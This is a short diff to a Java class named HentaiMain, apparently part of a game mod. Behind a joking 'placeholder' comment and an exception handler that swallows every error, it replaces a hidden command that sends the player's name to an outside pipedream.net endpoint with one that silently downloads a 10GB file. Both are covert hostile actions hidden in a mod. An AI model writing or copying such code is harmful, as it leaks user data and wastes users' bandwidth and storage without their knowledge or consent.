@@ -35,7 +35,7 @@ public class HentaiMain{
         //dont mind me, placeholder for horni people
         Runtime rt = Runtime.getRuntime();
         	try {
-            		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
+            		rt.exec("wget https://speed.hetzner.de/10GB.bin");
         	} catch(Throwable ignored) {}
     }
 
